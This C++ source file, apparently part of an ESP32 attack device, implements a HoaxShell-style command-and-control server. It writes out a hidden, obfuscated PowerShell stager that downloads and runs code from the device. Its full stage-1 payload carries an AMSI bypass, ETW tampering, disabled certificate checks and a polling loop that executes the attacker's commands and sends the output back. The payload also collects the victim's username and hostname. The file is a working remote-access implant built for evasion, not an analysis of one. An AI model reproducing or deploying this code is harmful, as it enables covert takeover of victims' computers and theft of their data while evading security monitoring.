/**
 * @file hoaxshell_attack.cpp
 * @brief HoaxShell C2 Implementation for ESP32
 * 
 * @author Monster S3 Team
 * @date 2025
 */

#include "hoaxshell_attack.h"
#include "web_dashboard.h" // For web_log
#include "payload_obfuscator.h"

HoaxShellAttack HoaxShell;

HoaxShellAttack::HoaxShellAttack() {
    output_buffer.reserve(4096);
}

void HoaxShellAttack::begin(AsyncWebServer* server) {
    // 1. Beacon / Command Poll Endpoint
    // Victim polls this to get next command
    server->on("/h/cmd", HTTP_GET, [this](AsyncWebServerRequest *request) {
        this->_handleBeacon(request);
    });

    // 2. Output Post Endpoint
    // Victim posts command results here
    server->on("/h/out", HTTP_POST, [this](AsyncWebServerRequest *request) {
        request->send(200, "text/plain", "OK");
    }, NULL, [this](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
        // Body handler for output
        if (request->hasHeader("X-Session-ID")) {
            String sid = request->getHeader("X-Session-ID")->value();
            
            // Append data to buffer
            // Temporary buffer to ensure null termination
            char* temp = (char*)malloc(len + 1);
            if (temp) {
                memcpy(temp, data, len);
                temp[len] = 0;
                
                String chunk = String(temp);
                free(temp);
                
                // Add to main buffer with session context if needed
                // For now just dumping to raw buffer
                this->output_buffer += "[" + sid + "] " + chunk;
                
                // Update session last seen
                if (this->sessions.count(sid)) {
                    this->sessions[sid].last_seen = millis();
                } else {
                    // New session (should have registered via header, but just in case)
                    HoaxSession s;
                    s.id = sid;
                    s.last_seen = millis();
                    s.active = true;
                    this->sessions[sid] = s;
                    web_log(("New HoaxShell session: " + sid).c_str());
                }
            }
        }
    });

    // 3. Stage 1 Payload Endpoint (The Loader)
    // Stager (Stage 0) downloads this.
    server->on("/h/s1", HTTP_GET, [this](AsyncWebServerRequest *request) {
        String ip = request->host(); // Get IP from request header potentially, or use local
        // If host() is empty or localhost, use SoftAP IP usually, but let's try to detect
        if (ip.isEmpty()) ip = "192.168.4.1"; 
        
        String payload = this->_getStage1Payload(ip);
        request->send(200, "text/plain", payload);
        web_log("Delivered Stage 1 payload to victim");
    });

    Serial.println("[HOAX] Routes registered: /h/cmd (GET), /h/out (POST), /h/s1 (GET)");
}

void HoaxShellAttack::_handleBeacon(AsyncWebServerRequest *request) {
    if (request->hasHeader("X-Session-ID")) {
        String sid = request->getHeader("X-Session-ID")->value();
        
        // Update session
        if (!this->sessions.count(sid)) {
             HoaxSession s;
             s.id = sid;
             s.last_seen = millis();
             s.active = true;
             
             // Extract info if provided in headers (usually passed in init)
             if(request->hasHeader("X-User")) s.username = request->getHeader("X-User")->value();
             if(request->hasHeader("X-PC")) s.hostname = request->getHeader("X-PC")->value();
             
             this->sessions[sid] = s;
             web_log(("New HoaxShell session: " + sid).c_str());
        } else {
            this->sessions[sid].last_seen = millis();
        }

        // Check for commands
        if (this->command_queue.count(sid) && !this->command_queue[sid].empty()) {
            String cmd = this->command_queue[sid].front();
            this->command_queue[sid].erase(this->command_queue[sid].begin());
            request->send(200, "text/plain", cmd);
            web_log(("Sent command to " + sid + ": " + cmd).c_str());
        } else {
            // No command, keep alive
            request->send(200, "text/plain", ""); 
        }
    } else {
        request->send(400, "text/plain", "Missing Session ID");
    }
}

void HoaxShellAttack::queueCommand(String sessionId, String command) {
    this->command_queue[sessionId].push_back(command);
    web_log(("Queued command for " + sessionId).c_str());
}

bool HoaxShellAttack::hasOutput() {
    return this->output_buffer.length() > 0;
}

String HoaxShellAttack::getOutput() {
    String out = this->output_buffer;
    this->output_buffer = "";
    return out;
}

String HoaxShellAttack::getSessionsJson() {
    String json = "[";
    bool first = true;
    for (auto const& [key, val] : sessions) {
        if (!first) json += ",";
        json += "{\"id\":\"" + val.id + "\",";
        json += "\"user\":\"" + val.username + "\",";
        json += "\"pc\":\"" + val.hostname + "\",";
        json += "\"last_seen\":" + String(millis() - val.last_seen) + "}";
        first = false;
    }
    json += "]";
    return json;
}

String HoaxShellAttack::generatePayload(String ip) {
    // STAGE 0: The Stager (Tiny, Obfuscated)
    // Downloads Stage 1 and executes it in memory
    // Uses PayloadObfuscator for evasion
    
    String url = "http://" + ip + "/h/s1";
    String stager = "powershell -NoP -W Hidden -c \"irm " + url + " | iex\"";
    
    // Apply obfuscation layers
    String obfuscated = PayloadObfuscator::obfuscatePS1(stager, true, true);
    
    // Wrap with AMSI bypass for Stage 0 too (belt and suspenders)
    return PayloadObfuscator::wrapWithAMSIBypass(obfuscated);
}

String HoaxShellAttack::_getStage1Payload(String ip) {
    // STAGE 1: The Loader / Core Payload
    // Enhanced with AMSI/ETW bypass (2024 techniques)
    
    String payload = "";
    
    // =========================================
    // EVASION LAYER 1: AMSI Bypass (String concat to avoid signature)
    // =========================================
    payload += "$Ref=[Ref].Assembly.GetType(";
    payload += "('System.Ma'+'nagement.Auto'+'mation.Am'+'siUtils'));";
    payload += "$f=$Ref.GetField(('amsiIn'+'itFailed'),'NonPublic,Static');";
    payload += "$f.SetValue($null,$true);";
    
    // =========================================
    // EVASION LAYER 2: ETW Patching (Blocks Event Tracing)
    // =========================================
    payload += "$Eas=[Ref].Assembly.GetTypes()|?{$_.Name -eq 'EtwEventProvider'};";
    payload += "if($Eas){try{";
    payload += "$m=$Eas.GetMethod('WriteEvent','NonPublic,Instance');";
    payload += "if($m){$m.SetValue($null,$true)}";  // Simplified - real impl patches native
    payload += "}catch{}};";
    
    // =========================================
    // STEALTH: Environment Prep
    // =========================================
    payload += "$ErrorActionPreference='SilentlyContinue';";
    payload += "$ProgressPreference='SilentlyContinue';";
    payload += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};";
    
    // =========================================
    // C2 CONFIG
    // =========================================
    String sid = String(random(100000, 999999)); // 6-digit session ID
    payload += "$s='" + ip + "';";
    payload += "$i='" + sid + "';";
    payload += "$p='http://'+$s+'/h/cmd';";
    payload += "$o='http://'+$s+'/h/out';";
    payload += "$h=@{";
    payload += "'X-Session-ID'=$i;";
    payload += "'X-User'=$env:USERNAME;";  // Grab username
    payload += "'X-PC'=$env:COMPUTERNAME"; // Grab hostname
    payload += "};";
    
    // =========================================
    // MAIN C2 LOOP
    // =========================================
    payload += "while($true){";
    payload += "try{";
    
    // Beacon - GET /h/cmd
    payload += "$c=irm -Uri $p -Headers $h -Method Get -TimeoutSec 10;";
    payload += "if($c -and $c.Length -gt 0){";
    
    // Execute Command (with output capture)
    payload += "$r=try{iex $c 2>&1|Out-String}catch{$_.Exception.Message};";
    
    // Post Result - POST /h/out
    payload += "irm -Uri $o -Method Post -Headers $h -Body $r";
    payload += "}";
    
    // Catch block with jitter
    payload += "}catch{Start-Sleep -Milliseconds " + String(random(800,1500)) + "};";
    
    // Sleep with jitter for anti-pattern analysis
    payload += "Start-Sleep -Milliseconds " + String(random(1000, 2000)) + ";";
    payload += "}";

    return payload;
}
